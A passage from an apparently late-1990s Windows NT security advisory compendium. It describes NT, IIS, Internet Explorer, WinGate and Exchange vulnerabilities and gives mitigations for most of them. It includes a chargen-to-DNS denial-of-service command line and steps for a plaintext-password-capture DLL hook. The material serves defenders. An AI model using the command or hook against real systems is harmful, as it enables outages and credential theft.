According to Ralf Hueskes of Jabadoo Communications, the security hole exploits an error in the 
Internet Explorer 4.0 that can be fixed only by the manufacturer. Microsoft is aware of the 
problem and will make available a patch for download from http://www.microsoft.com/ie/ on 
October 17th 1997.
Experienced users can protect themselves by completely deactivating the execution of Active 
Scripting in the security settings (menu item: Tools/Options/Security, Settings/Custom (for expert 
users)/Active Scripting/Disable) and by using the Security Zones feature in Internet Explorer 4.0.

[13.0.7] 2 NT Registry Risks
Found by David LeBlanc (ntsecurity.net)


The Problem
The attack was described most adequated in the ISS X-Force Security Advisory:
ISS Security Alert
October 21, 1997
Scheduler/Winlogin Keys have Incorrect Permissions
This advisory describes two similar configuration problems in the Windows NT Registry key 
permissions. These vulnerabilities can allow users with Server Operator privilege to increase their 
access level to Administrator.
Problem 1: Scheduler Key Has Incorrect Permissions
Affects: Windows NT
Description: The HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\Schedule key 
controls the schedule service. Server Operators have permission to write to this registry tree, 
which would allow them to manually schedule jobs to be run by the schedule service, which 
normally executes under the system user context. This can be used to raise the Server 
Operator's access level to Administrator.
Risk: Medium
Solution: Local Machine (GUI): From the Start menu, choose 'Run.' Type 'regedt32' and click 
'OK.' This opens the Registry Editor. Through the Security menu, remove write access to the 
Schedule key for Server Operators.
Problem 2: Winlogon Key Has Incorrect Permissions
Affects: Windows NT
Description: The 
HKEY_LOCAL_MACHINE\Software\Microsoft\WindowsNT\CurrentVersion\Winlogon key has two 
values which can be used to cause a process to execute upon either system bootup, or when a 
user logs on. The programs pointed to by the System value run under the system user context 
after boot, and could be used to change a user's rights or access level. The UserInit value runs 
applications when a user logs in. The default settings for this key allow Server Operators to write 
these values, either of which could be used to raise a System Operator's access level to 
Administrator.
Risk: Medium
Solution: Local Machine (GUI): From the Start menu, choose 'Run.' Type 'regedt32' and click 
'OK.' This opens the Registry Editor. Through the Security menu, remove write access to the 
Winlogon key for Server Operators.
================================
Caution: Care must be taken when using the Registry Editor. If incorrect values are entered, the 
system may become inoperable. Should a mistake be made when editing the registry values, the 
registry state can be restored to the state at the last time the system booted up. For more 
information, see the Windows NT Help under the "Registry" section.

[13.0.8] Wingate Proxy Server
Found by Bill Mattocks


The Problem
The attack was described most adequated by the person reporting it to us, Bill Mattock:
A recent hole has been discovered in the default security settings of a popular Windows 95 / 
Windows NT proxy server called WinGate, by Deerfield Communications:
This bug was discovered by a 15-year-old hacker, Joshua E. Rodd, whose e-mail address is 
jerrod@ibm.net
As a semi-well-known anti-spammer, I am active in the Usenet newsgroup known as 
news.admin.net-abuse.email. Recently, we anti-spammers came under attack by person or 
persons unknown, who was sending us a variety of hateful e-mail, seemingly from different dialup 
ISP ports around the world.
I was fortunate enough to observe two such attacks in progress, and I telnetted to the IP 
addresses indicated by the headers on the e-mail messages. In each case, I was greeted by a 
"WinGate>" prompt, although the IP addresses were different.
Apparently, a number of other anti-spammers got the same "hate" e-mail, and notified the ISP 
that the e-mail appeared to be coming from - in at least one case, a dialup user lost their access 
because of the complaints.
Because I had seen a "WinGate" prompt at two different IP addresses were the attacks seemed 
to be originating from, I decided to do a little digging. I discovered that the text of the message 
contained some mispellings that were unusual. I used DejaNews to search for those mispellings, 
in conjunction with the word "WinGate." I thereby discovered young Mr. Rodd. 
He had discovered this bug, had written an exploit for it, and had written a netscanner which 
would comb a specified netblock looking for vulnerable WinGate hosts. He managed to find that if 
one telnets to a WinGate host that is not properly secured (which was, until a week or so ago, the 
default state of these servers), one could telnet into and then back out of the WinGate server, 
which would "launder" one's actual IP address. Thereafter, if one mounted an attack on another 
machine, or if one sent e-mail by "hijacking" an open SMTP server, one would seem to be coming 
from the location of the WinGate server. This exploit was used to harass anti-spammers with 
untraceable e-mail, but one could well imagine that it could be used for a variety of other attacks.
It is easy to see that this type of IP laundering would be simpler to perform than IP spoofing, and 
nearly as bulletproof in terms of being untraceable.
Joshua has, unfortunately, disseminated his hacking tools far and wide by now, as he was quite 
proud of his abilities.
This information has been reported by C/Net news last week, and has been given to Deerfield 
Communications as well. Michael Deerfield is the CEO of the corporation, and he is quite 
concerned, but he is also understandably quite concerned about the potential publicity damage to 
his company. He was initially a bit hostile, posting messages in Usenet news to the effect that this 
type of "wide open" behaviour of his WinGate Proxy server was "by design," and was totally 
secure. He failed to immediately grasp that although the INTERIOR of the proxy server probably 
is safe from attack, the rest of the Internet is not safe from this exploit, which would result in 
fingers of blame being pointed back at his innocent clintele, and then eventually to WinGate.
WinGate has indicated that this "bug," which they still claim is not a bug, has been repaired in the 
newest version of WinGate, v2.0. However, WinGate is available as shareware, and Deerfield 
Communications has estimated that there are hundreds of thousands of copies of the older 
software in circulation. Deerfield HAS placed simple instructions on disabling telnet on their web 
page, with a quick description of why a sysadmin would want to do so.
This information has been reported to CERT at cert@cert.org, however, they have not responded 
at this time, and it has been nearly two weeks since I reported it. Vint Cerf has also been notified, 
and he assigned an MCI security person to look into it, and that person has not responded to me 
at this time, either (after an initial e-mail message, that is).
As this is not an exploit designed to penetrate a network, nor is it an Denial of Service attack, I 
believe that many people are pooh-pooh'ing the incident, and I have heard comments to the 
effect that "all firewalls and proxy servers are like that." Perhaps so, but I only know of this one at 
this time.

[13.0.9] O'Reilly Website uploader Hole
Found by Herman deVette


Systems running Website(c) with uploader.exe in place are vulnerable. Website ships with a 
program called UPLOADER.EXE that allows compatible Web clients to upload files to the Web 
server. Using the UPLOADER.EXE application with a modified HTML page will allow an attacker 
to upload an file the attacker wishes.

The following is from Herman:
"The program uploader.exe doesn't check anything at all. If you're lucky, you're running Windows 
NT and have put only "read/execute access" on CGI-WIN and other executable paths. Otherwise 
(win95) you have a real problem. You could create a CGI program, next you change the HTML 
file a little like this.
Open the HTML file in your browser, select a nice CGI file to upload and run that CGI program 
remotely. (No need to tell you what this CGI program could do, could be .bat file too in one of 
Website's other CGI directories)"
Herman de Vette
To Stop the problem, get rid of the uploader.exe application and ftp your information.

[13.1.0] Exchange 5.0 Password Caching
Found by Rajiv Pant


Exchange 5.0 Server's POP3 service has a bug in it that causes the system to not properly flush 
cached passwords. Old passwords will continue to be valid along with newly set passwords. This 
problem will persist until the cache is flushed. David LeBlanc points out that Microsofts FTP, 
HTTP,and Gopher service also suffer from the same problem. The problem does not affect NT 
logins themselves.
To correct the problem, you must edit the following registry keys:
HKLM\System\CurrentControlSet\Services\MsExchangeIs\ParametersNetIf\Credentials
Cache Age Limit (Default = 120 minutes)
HKLM\System\CurrentControlSet\Services\MsExchangeIs\ParametersNetIf\Credentials
Cache Idle Limit (Default = 15 minutes)
HKLM\System\CurrentControlSet\Services\MsExchangeIs\ParametersNetIf\Credentials
Cache Size (Default = 256 buckets)
Make the settings = 0

[13.1.1] Crashing NT using NTFS
Found by Martin Stiemerling


Affects NT systems running Service Pack 3 also.
Recently, a program released from Germany (crashnt.exe) seems to be able to crash an NT 
server. The program was coded by Martin Stiemerling. It executes in a command window and 
functions off of one parameter, a drive letter. (example: crash d:). It seems that the program may 
be a spawn of an NT Defragmentation program. The fact that this program will crash and render 
an NTFS volume useless is spooky.
David LeBlanc says he thinks this may be a result of something in the NtFsControlFile() function.

[13.1.2] The GetAdmin Exploit
Found by Konstantin Sobolev


The GetAdmin program originated in Russia and has the ability to add users to the Administrators 
group. No special permissions are needed to execute the program, which interestingly runs 
through a telnet session as well. Microsoft released a patch that they said stops the attack. If 
however, you run crash4.exe on the server first and then run GetAdmin, the exploit still works. (All 
of the executables discussed here are available in the tools section.)

[13.1.3] Squid Proxy Server Hole
Found by Fred Albrecht


If someone FTP's into site via URL, the password the user uses could possibly be recovered from 
NetScape Communicator or from the logs of the Squid Proxy server (versions 1.1.10 and 1.1.11).
-- Excerpt from ntsecurity.net
Method for testing:
1. Start NS Communicator 4.0
2. Enter a URL of the form "ftp://user@host.domain.xxx"
3. Communicator pops up a password entry dialog. Enter the password.
4. When the file list is displayed in the browser window, follow the "Parent Directory" link
5. Click the BACK button (seems to be optional in Linux)

The password is now plainly visible in the URL field, similar to the following:
"ftp://user:passwd@host.domain.xxx"
We'll explain this out a bit clearer below:
Normally, if a site allows anonymous FTP, this means you don't need a username and password 
pair to login. You just use "anonymous" and your email addr for the password and you're in - 
which is handled transparently by your browser when used for FTP access. But if the site is 
regulated, and requires a username password pair, then you'd be prompted by Communicator 4.0 
if, and only if, you used Communicator to FTP to that protected site.
Let's say you want to FTP to a site which is protected. You'd enter a URL like this: 
"ftp://yourname@ftp.someftpsite.com - at which point Communicator connects to the site, and 
pops up a window asking you to enter your password that matches the "yourname" user account. 
You enter the password, click OK, and it sends it to the site for authentication. BUT, IT ALSO 
PUTS IT IN THE HISTORY FILE OF COMMUNICATOR in this format: 
"ftp://yourname:password@ftp.someftpsite.com".
So you can see, in the beginning, the URL did not have the password included. But, once you 
enter the password using Communicator 4.0, it gets added to the URL and put in the history file.
Therefore, anyone with access to your Communicator would have access to your history file, and 
thus, the stored passwords - should there be any.
Be aware that it has been reported that JavaScript can access the history list, meaning a 
malicious Web page could be grabbing passwords from your browser without your knowledge.
ALSO - it appears that the Squid Proxy Server is in fact writing the user's password in plain text to 
its own logs as well - which we should all know is a bad thing.
Netscape says the root of the problem lies in the Squid Proxy, not Communicator.

Stopping the Attack : Don't use Communicator for FTP'ing to sites that require a username and 
password. Use a standalone FTP client instead, until Netscape releases a fix.

[13.1.4] Internet Information Server DoS attack 
Found by Todd Fast 

You can crash an IIS box by sending a large URL to it (4-8K). --To Quote ntsecurity.net According 
to Microsoft personnel, "it's a very specific boundary condition when parsing the headers. The 
end of a token (method, URL, version or header) must be exactly at 8k, followed by a second 
token. Our max header buffer is 8k, anything beyond gets thrown out as an invalid request. In this 
particular scenario, an index gets misinterpreted as a pointer so we deref 0x00002000 which lo' 
and behold, doesn't exist." 
Stopping the Attack : Load the patch available from microsoft. 


[13.1.5] Ping Of Death II
Found By Jiva DeVoe


In keeping with the tradition of the first ping of death, Ping Of Death II (Or SPing) sends multiple 
64k packets, which still become fragmented and will cause a windows system to lock up 
completely.
Stopping the Attack : Block all inbound ICMP traffic.

[13.1.6] NT Server's DNS DoS Attack
--From ntsecurity.net


Microsoft DNS can be made to crash by redirecting the output of the Chargen service to the MS 
DNS service. A typical attack might be launched from a system using the following command:
$ telnet ntbox 19 | telnet ntbox 53
The above command is shown as seen on a UNIX command line. Once the command is issued, 
a telnet session is opened on port 19 (chargen) of the ntbox, and all output is redirected to a 
second telnet session opened on port 53 (dns) of the same ntbox. Launching the attack in this 
manner may subject the attacker to the same barrage of packets the DNS service will experience. 
But none-the-less, the attack is successful in crashing MS DNS.
Stopping the Attack : Stopping the attack is done by performing one of the following:
Don't run MS DNS until it's proven to be less bug ridden. Instead, you may opt for running a free 
version of BIND for NT which is not subject to this attack. If you rely on MS DNS interoperating 
with WINS, you may opt for MetaInfo's DNS, which is a direct BIND port and works great in 
conjunction with WINS. If you must go on using MS DNS, be forewarned that it may be incredibly 
difficult to stop this attack, since it can be done through impersonation and by using non-standard 
ports for chargen.
You can block port TCP port 53 using NT's built-in TCP/IP filtering. This stops zone transfers and 
TCP based name resolutions. This does not stop the UDP port 53 from continuing to operate 
normally. DNS normally relies on UDP for its name resolution transactions.
Or, you can filter TCP port 53 on your routers to bordering networks, allowing only trusted 
secondary DNS servers to do zone transfers.
Any one of the above three solutions should help you stop the attack cold.
This type of attack (pointing chargen output to other ports) can go along way towards bogging 
down lots of services, some of which die like MS DNS. You'd be well advised to disable NT's 
Simple TCP/IP Services (if installed) using Control Panel | Services. This stops the chargen, 
echo, daytime, discard, and quote of the day (qotd) services. Any of which could be used for 
denial of service attacks. None of these services are required for proper network operation - 
although you should be aware that a few types of network monitors occasionally test the echo 
port when they cannot get a response using ping. If you find the need to run one or more of these 
services independant of the others, you can turn on/off each respective service by adjusting 
Registry entries found in the following subtree:
HKEY_LOCAL_MACHINE\CurrentControlSet\Services\SimpTcp\Parameters
By changing the established value of both the EnableTcpXXXX and EnableUdpXXXX parameters 
from 0x1 to 0x0, you effectively disable that particular service.
The following parameters are available for adjustment:
EnableTcpChargen
EnableTcpDaytime
EnableTcpDiscard
EnableTcpEcho
EnableTcpQotd
EnableUdpChargen
EnableUdpDaytime
EnableUdpDiscard
EnableUdpEcho
EnableUdpQotd
BE CAREFUL WHEN MAKING REGISTRY CHANGES, AS ERRORS CAN RENDER A SYSTEM 
NON-BOOTABLE.
Keep in mind that this does not stop attacks that originate from other system's chargen ports, nor 
will it stop impersonated port attacks.

[13.1.7] Index Server Exposes Sensitive Material
Found by Andrew Smith


One of the components of Index Server (which is the internal search engine component thats part 
of Internet Information Server.) can expose material of a highly sensitive nature. This component, 
webhits.exe allows the web server to read files it would normally not be able to read. If the 
administrator of the server has left the default sample files on IIS, a hacker could easily have the 
ability to narrow their searches for usernames and passwords. Once an intruder has located an 
IIS box that has these default samples still on the server, the intruder can use the sample search 
page to specify only files that have the word password in them and are script files.
The URL the hacker would try is http://servername/samples/search/queryhit.htm then the hacker 
would search with something like "#filename=*.asp"
When the results are returned not only can one link to the files but also can look at the "hits" by 
clicking the view hits link that uses the webhits program. This program bypasses the security set 
by IIS on script files and allows the source to be displayed.
The default path to webhits.exe is:
http://servername/scripts/samples/search/webhits.exe
Stopping the Attack : Remove webhits.exe or move it from its default location.

[13.1.8] The Out Of Band (OOB) Attack
This is a DoS attack that affects NT and 95 machines alike.
--To Quote ntsecurity.net


How it Works:
The attack is done by sending Out of Band (OOB) data to an established connection. NetBIOS, 
which listens on port 139 among others, seems to be the most affected - but the attack may work 
against MS-DNS running on port 53, causing massive Event Log entries related to "select() 
errors", as reported by David LeBlanc. Apparently the OS doesn't know how to handle OOB data 
properly, so it may panic, causing strange things to happen. NT displays the Blue Screen of 
Death (BSOD) indicating TCPIP.SYS as the cuplrit, and definately requires a reboot after being 
attacked. Windows 95 may or may not crash completely, but always presents a blue exception 
screen, indicating MSTCP and NDIS as the culprits. Win95 always stops talking on the network 
after the attack.
STOPPING THE ATTACK:
Block inbound access to port 139 at your router. Alternatively you can stop the server service on 
NT systems, but this renders the box unable to share objects such as printers and directories. 
You may also use the built-in NT TCP/IP filtering to block non-local network access to port 139.
In regards to Windows 95 machines, the only way right now to disable port 139 is to unload 
network drivers completely, or use a packet filter to block traffic to port 139 on that machine, as 
mentioned above.

[13.1.9] SMB Downgrade Attack

May 6, 1997 - 3pm CST [NTSD] - On the heals of April's RedButton exploit comes yet another 
demonstration of attacking NT networks. A new program has just been released, complete with 
source code, that will downgrade a Server Message Block (SMB) negotiation - the standard 
handshake that occurs when a client attempts to connect to an NT Server. Downgrading the 
authentication causes the client to send its password in clear text, unencrypted - Ouch. This has 
been a known possibility for quite some time, however no one has released a working program 
along with source code up until now.
The program actually runs on a Windows based system loaded with Novell ODI style drivers 
running in promiscuous mode. Once active, the software listens for SMB negotiations, and upon 
detecting one, the software sends a single packet to the client instructing it to downgrade its 
connection attempt to a clear text level - at which point the client silently obeys by sending its 
password in clear readable text. Once this happens this little piece of software actually grabs the 
password as it travels over the wire and displays it on the screen. The client is successfully 
connected to the NT Server, and the user remains none-the-wiser that its password has just been 
grabbed.
Under Windows networking, when a client creates a new connection to an NT Server, the clients 
can be instructed to use a particular authentication mechanism: clear-text or challenge/response. 
As a result, clients can be instructed to transmit their password in clear text form very easily.
Furthermore, if an NT Server requested an encrypted login from the client, NT will authenticate 
the client, even if the client submits the password in clear text after being told to send an 
encrypted challenge/response answer. To make matters worse, there is no indication that this is 
taking place, and there is no way to provide an audit trail on the NT Server that indicates the 
clients are using clear-text passwords - even though the server has requested encrypted 
authentication. Perhaps NT should in fact be capable of logging an audit trail on this type of 
activity (hint hint).
A result of this design characteristic, a rogue client could sit on your network silently listening for 
username and password pairs traveling across the network during authentication. No physical 
access or user rights and permissions are required for this attack to work! All that's need is a 
connection to your network between the clients and servers.
As I said, this type of SMB downgrade attack has been a known possibility for quite some time - 
as noted in the Common Internet File System (CIFS) specification (section 8.5.2) - and similar, 
although not quite the same types of exploits have been demonstrated recently by various college 
students attempting to show vulnerabilities in Internet Explorer and Windows NT. Previously, NT 
LAN Manager negotiation and hostile SMB servers were shown to effectively initiate, intercept, or 
intervene in certain aspects of the client/server authentication process.
The person bringing this new program to our attention, David Loudon, has suggested that, 
"Microsoft could initially create a server patch that would not allow the NT Server to accept clear 
text passwords. While this does not prevent the exposure of the clear-text password, at least the 
administrator would be alerted that clients were sending clear-text passwords when requested to 
send encrypted passwords. To completely resolve this issue, all Microsoft networking clients must 
be replaced with new code that would never send clear text passwords during the authentication 
process.
"As long as Microsoft networking is enabled on any DOS, Windows 3.1, Windows for 
Workgroups, Windows 95, or Windows NT clients, users are susceptible to disclosing their clear 
text passwords to other devices on the physical network. Resolving this issue requires an 
administrator to update the Microsoft networking components on all affected desktops as soon as 
a fix is available from Microsoft."
Microsoft is definitely aware of this issue, and it appears that this type of functionality was 
knowingly put in place in order to remain backward compatible with older Microsoft clients like 
DOS. As a result, don't expect to see a fix for this until Service Pack 3 comes out, and maybe 
even later.
The new CIFS Authentication proposal seems to address this issue and a few other potential 
nasty security problems, but there is no guarantee the new CIFS specs will make it into SP3 yet. 
The probable outcome is that the new CIFS Authentication specification, which is being hashed 
out in a public forum on the Internet, will contain newfound configuration switches that can force 
the client and/or servers to require either clear text or encrypted negotiations.

[13.2.0] RedButton
--From ntsecurity.net

A new program was released this weekend that allows ANYONE with remote access to an NT 
server (using ports 137, 138, and 139) to connect to that machine, read the registry, and create a 
new share accessible to the Everyone group. This is a SERIOUS problem that should be guarded 
against at all costs. A quick test of this new RedButton program shows that it does in fact connect 
to a remote NT system.
Administrators should seriously consider blocking access to ports 137, 138, and 139 on any 
machines exposed to the Internet. You can also stop the Server service to protect yourself, 
although doing so eliminates the ability for that server to share resources.
Another consideration is to edit the Registry as follows:
1. Open HKEY_LOCAL_MACHINE/CurrentControlSet/Control/SecurePipeServers
2. Create a key called winreg (if it doesn't exist)
3. Set the security on it however you like, but don't give the Everyone group access - but don't 
define Everyone with NO ACCESS either as this locks out all accounts.
4. Reboot the system
RedButton was released by MWC, security consultants, who are maintaining a Web page about 
the new RedButton software at http://www.ntsecurity.com/redbutton. NOTE: This Web address is 
ntsecurity.com - not associated with NTSD or ntsecurity.net. We are not responsible for content at 
thier site.
RedButton will:
* logon remotely to a target computer without presenting a username and password
* gain access to the resources available to the Everyone group
* determine the current name of built-in Administrator account
* read several registry entries and display the information
* list all shares - even hidden shares
Microsoft released a HOTFIX for the RedButton problems on May 3, 1997. Be CERTAIN to read 
the Knowledge Base articles and README files in the distribution directory - this software hotfix 
installs itself without warning so be careful to understand it completely before proceeding.

[13.2.1] FrontPage WebBot Holes
---From ntsecurity.net

Microsoft has uncovered a bug in the Microsoft FrontPage Server Extensions that allow 
knowledgeable users to potentially add content to pages on a Web site without permission 
through use of raw HTML. This can only happen if:
Someone viewing a Web page has an advanced mastery of HTML
The Web site is hosted on a server that contains the FrontPage server extensions
A Web page contains a Save Results WebBot Component or a Discussion WebBot Component
Since raw HTML is not filtered out of entries made in the entry fields of the Save Results or 
Discussion WebBot Components, it is possible for a knowledgeable person browsing a site to 
enter the tags necessary to create a form within these fields. If the results page is then fetched for 
browsing the newly inserted form will be available for use by anyone browsing the site. The result 
is that anyone browsing could then append information to pages in the Web site even though they 
do not have authoring permission.
After isolating the bug and replicating it we concluded the best way to address the issue was to 
create new versions of the FrontPage 97 Server Extensions. These Server Extensions are being 
made immediately available at no charge to all of our users via download from the FrontPage 
Web site at http://www.microsoft.com/frontpage/softlib/current.htm. In addition, we are in the 
process of proactively sending a set of the updated FrontPage 97 Server Extensions to all 
Internet Service Providers we know of that are currently using the FrontPage Server Extensions, 
and we will also include them in the Windows NT Server Service Pack 3.
This issue came to our attention within the last two weeks from a Microsoft employee creating a 
Web site with FrontPage. Since then we have been confirming and replicating the error to ensure 
that it was not an isolated incident. As far as we know, this issue has affected no one outside of 
Microsoft.
This bug affects Web sites created with FrontPage 1.1 for Windows and FrontPage 97 with 
Bonus Pack for Windows that are hosted on Web servers with any version of the FrontPage 
Server Extensions installed. However, it only affects those sites that contain the WebBot 
components described above.
Any web server with the FrontPage 97 or 1.1 Server Extensions installed and active FrontPage 
webs with the WebBots specified above are potentially at risk. If the server has server-side 
include capability enabled then the potential exposure is higher. However, server-side includes 
are a Web server feature that should be carefully evaluated by any Internet server owner 
regardless of whether the FrontPage Server Extensions are installed.
This issue is most likely to be a problem for Internet Service Providers who are hosting webs on 
the Internet with the FrontPage Server Extensions. However, FrontPage 97 automatically installs 
a web server onto the workstation in order to store Web sites on the workstation for local 
authoring and staging. Consequently each workstation with FrontPage 97 should be upgraded 
with the new version of the FrontPage 97 Server Extensions for maximum security. If your 
workstation does not have a full-time connection to the Internet and you connect occasionally 
through a modem then the risk of exposure is low but still present, and Microsoft recommends 
that you install the new Server Extensions.

[13.2.2] IE and NTLM Authentication
--From ntsecurity.net

A new problem discovered in MS Internet Explorer shows that NT transparently negotiates an 
authentication attempt with a remote Web server any time that remote server requests an NTLM 
authentication process. During that process, Internet Explorer will transmit your user name, 
password, NT domain or workgroup name, and hostname.
Take note here that during this negotiation process, two versions of the user password are 
transmitted. One is the full length password and the other represents the first 14 characters of the 
password, transformed in to upper case letters. This fact alone is a GREAT argument for longer 
passwords - longer that 14 chars that is.
IE clients cannot detect whether or not this negotiation process is taking place, which makes it 
incredibly difficult to anticipate. Furthermore, IE can't determine what server it's talking to -- that is 
to say, it doesn't know if the server is a valid system to negotiation with -- which means it could be 
a rogue system. A server could preplan an attack by precomputing a giant database of potential 
passwords, which can be used for comparison.
This is NOT an SMB issue, this is an NTLM issue.
EXAMPLE
The example is on the page where this was first announced. Please click here to jump to the 
original page.
SOLUTION
You can protect yourself right now by stopping the NTLM SSP service, and disabling it. You may 
do this using Control Panel | Services, but keep in mind this may adversely affect the operation of 
the NT system - we take no responsibility.
Microsoft knows about this problem, and is looking in to it as of March 14, 1997. Watch this page 
for more info.

[13.2.3] Run Local Commands with IE
--From ntsecurity.net

An icon can be embedded within a web page, which when double-clicked, may run a remote 
application without warning. This is NOT the same bug as the ".LNK and .URL" problem 
discovered recently.
According to the author, "this bug only effects Internet Explorer 3.0 users (version 4.70.1215). 
The problem is significantly more serious if the user is on a platform with CIFS (Windows NT 4.0 
with Service Pack 1 or later installed). If this is the case, the location of the malicious executable 
code to be run on the victim's machine could be anywhere on the Internet. If this is not the case, 
the location of the machine containing the code is restricted to within the scope of Windows name 
resolution. For example, the host must be either on the same subnet, listed in the victim's 
LMHOSTS file, or listed on the victim's WINS server."
Internet Explorer enables a user to utilize a URL describing a remote directory. When clicked, the 
desktop moves to a Windows Explorer window -- but it's inside of Internet Explorer. If this URL is 
used as the basis for an <IFRAME> tag, an embedded frame can be created with what is 
essentially a Windows Explorer window inside. If this window is made small enough, it appears to 
be some sort of button, which when clicked runs a remote program. CIFS allows a machine to 
use the IP or hostname provided in the URL as a way of contacting the remote host containing 
the executable. 

[13.2.4] IE can launch remote apps
--From ntsecurity.net

Microsoft Internet Explorer v3.01 has a serious bug which allows web page writers to use ".LNK" 
and ".URL" files to run programs on a remote computer. This bug is particularly damaging 
because it uses NO ActiveX, and works even when Internet Explorer is set to its highest security 
level. It was tested on Microsoft Internet Explorer Version 3.0 (4.70.1155) running Windows 95. 
Microsoft says that users running Internet Explorer 3.0 and 3.01 for Windows 95 and Windows 
NT are affected. It does not affect users of Internet Explorer 3.0 / 3.0a for Windows 3.1 or Internet 
Explorer for Macintosh 2.1 / 3.0 / 3.0a.
.URLs work in both Windows 95 and Windows NT 4.0 -- .LNK's only work in Windows 95 -- .URL 
files present a possibly greater danger because they can be easily created by server side scripts 
to meet the specific settings of a user's system. We will provide .URL files for execution in the 
next day or so on this page.
The "shortcuts" can be set to be minimized during execution which means that users may not 
even be aware that a program has been started. Microsoft's implementation of shortcuts 
becomes a serious concern if a webpage can tell Internet Explorer to refresh to an executable. Or 
worse, client side scripts (Java, JavaScript, or VBScript) can use the Explorer object to transfer a 
BATCH file to the target machine and then META REFRESH to that BATCH file to execute the 
rogue command in that file.
The META REFRESH tag can be used to execute multiple commands in sequence. This demo 
copies a .BAT file into your Internet Explorer cache and then runs the .BAT file. This .BAT will 
create a new key in your registry called "HKEY_CURRENT_USER/Software/Cybersnot". It will 
then open your AUTOEXEC.BAT and CONFIG.SYS in notepad. Finally, it will open REGEDIT so 
that you can view the key it creates. According to its author, the demo below does not destroy 
anything and should not cause any problems on your system. HOWEVER by downloading it, you 
assume complete liablity for what it may do to your system.

[13.2.5] Password Grabbing Trojans
From Jeremy Allison

I am posting this to both the Samba list and the nt-security list as I believe this information will be 
of interest to both groups. This message is somewhat long and contains code fragments so my 
apologies if this is of no interest to you (just hit delete :-). Over several years helping to write 
Samba and dealing with UNIX and NT integration problems one of the most common requests I 
have seen is some way to get a UNIX box (maybe running Samba) to act as a NT domain 
controller, or for some way to unify the password databases between UNIX boxes and NT 
Domains. The first problem is not solveable due to the amount of Microsoft proprietary 
information they would have to reveal, and MS are not willing to make that available. The second 
problem however, is more tractable. It seems in NT4.x Microsoft have finally revealed enough 
information to make synchronisation between UNIX and NT password databases possible.
Sync'ing from a UNIX box to an NT box was always possible, as the API's to change an NT 
password have always been available in the old Lanman API set, the difficulty was sync'ing NT 
password changes to a UNIX box, as the password change API's always seemed to go into a 
'black box'to which no external access was available. It had to be possible, however, as NT 
Domains are perfectly capable of synchronising with Netware LANs. As the password hash 
mechanisms in NT and Netware are different the Netware password update mechanism had to 
be able to get at the plaintext password at the update time, before it got hashed and placed in the 
NT SAM. This mechanism is now available to other libraries on NT 4.x.
On NT 4.x there is a Key
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa
and one of the defined name/value pairs is "Notification Packages" which is a Multi_string value 
which as shipped has a value of FPNWCLNT. This is obviously the name of a DLL (as I found it 
as FPNWCLNT.DLL in %SYSTEMROOT%\SYSTEM32) and logic would dictate that this was the 
place that the Netware password updates were done. The latest Microsoft SDK held the missing 
part of the puzzle, the neccessary API's that need to be in such a DLL in order for it to get 
password change notification. So here below, is a very simple DLL that will receive plaintext 
password change notifications from the NT LSA code. The sample code just logs all password 
change notifications to a file called C:\TEMP\PWDCHANGE.OUT, but it illustrates the technique. 
To test it, comple the C code and .DEF file into a DLL called pwdchange.dll, copy it to 
%SYSTEMROOT%\SYSTEM32 update the value

to read
FPNWCLNT
PWDCHANGE
(NB. The newline between the two is *important*). and then reboot the machine. Tests show that 
all password changes are now funnelled through this DLL with the following information, 
Username, Plaintext password, RID (relative domain id). More interesting is that on creation of a 
new user this DLL is also called, this could be used to do centralized account management by 
creating a new UNIX user on the fly as a new NT user is created. Such a library would be 
installed on the Primary domain controller for an NT domain, and will then allow all users 
passwords to be propagated to non-NT systems as they are changed. The useful thing about this 
method is that it gets called on *all* forms of password update, from using CTRL-ALT-DEL to 
update your password, using USERMGR to change a password, or even by using the net user 
<username> <password> command from the command prompt.
My own uses for this will be to keep an smbpasswd file up to date for the use by Samba, but a 
proposed mechanism to keep a UNIX password database in synch would be as follows:
1). Keep the notify DLL simple, as it is called in the context of an NT security system - we don't 
want complexity here. Just write the change information down a named pipe from the DLL.
2). Create a service, that creates the read end of the above named pipe. This service is 
configured with the following information, held in the registry.
a). The name of the UNIX machine and TCP port number of a process on it to communicate with.
b). A 'secret' DES key (secret in quotes as anyone with Administrator access could read it) which 
is used to encrypt the change notifications going across the net. This service would just read 
password change notifications, encrypt the data and ship it to a UNIX machine where it could be 
processed. This service can get as complex as we like, with queueing, retry, handshaking etc.
3). Create a UNIX daemon, running as root, listening on the TCP port named above for password 
change data. This daemon also needs access to the 'secret' DES key to decrypt the data 
(probably in a root owned and read-only be root file).
This daemon could then be configured to keep whatever databases residing on the UNIX side in 
sync are required. Suggestions are the UNIX password database, the Samba database, a 
Kerberos password database, Oracle, Sybase.... be my guest :-).
If this above daemon is written so that new change notification modules can be plugged in to it 
(like the PAM spec as an example) it would be flexible enough for all the above. Of course this 
will make any securiy expert shudder, as compromising the DES key comprmises all new 
password changes, but that's the price we pay for simplicity (Bruce Schneier(sp?) would 
definately not approve :-). Anyway enough with the pontificating, here's the code :-). (Code was 
written with Microsoft Visual C++ 4.x, not tested on other compilers). As always, this code has no 
warranty, and using it may cause your system to self destruct in 5 seconds .. .etc, etc, etc.... 
(hope that's enough legal-ease to protect me :-)
Some comments by: Mark Joseph Edwards
Although some people think that this exploit only works on a PDC, this is NOT so. It works just 
fine on NT systems installed just as a server (non-domain controller), and it also works just fine 
on NT Workstation. This DOESN'T work on a Backup Domain Controller, but it DOES work on a 
Primary Domain Controller. Also, take note that NT 4.0 and Service Pack 2 (or greater) are 
required for this to work on any variety of NT installation. If you want more information on this 
hook, see Microsoft's Knowledge Base article # Q151082, located here. You may also want to 
take note right here and now that the MSGINA.DLL, which is the default "Graphical Identification 
and Authorization" provider for the local console logon, could also be overwritten with a trojan 
.DLL. Once this happens, you're toast. Ouch!
Here's Jeremy's useful (non-trojan) code:

[13.2.6] Reverting an ISAPI Script

ISAPI scripts run under the IUSR_MACHINENAME account under IIS, and thus, inherit the 
security permissions of this account. However, if the ISAPI program contains a simple call 
labelled RevertToSelf(), you have a big hole. Once that program line is executed, the ISAPI 
program reverts it's authority to the all-powerful SYSTEM account, at which point the program 
can do just about anything, including successfully execute system() calls.
Try it yourself - this DLL runs on Intel based IIS machines. Drop it in your scripts directory, and 
call it without any parameters using your Web browser. (i.e. 
http://www.yoursite.com/scripts/revert.dll) It creates a directory called C:\IIS-REVERT-TEST with 
no trouble at all :( I tested this on an NTFS partition with no normal user permissions on the root 
directory.
Additionally, Laxmikant Gunda was kind enough to report to us that there is yet another way to 
perform this same exploit. Laxmikant offers the following:
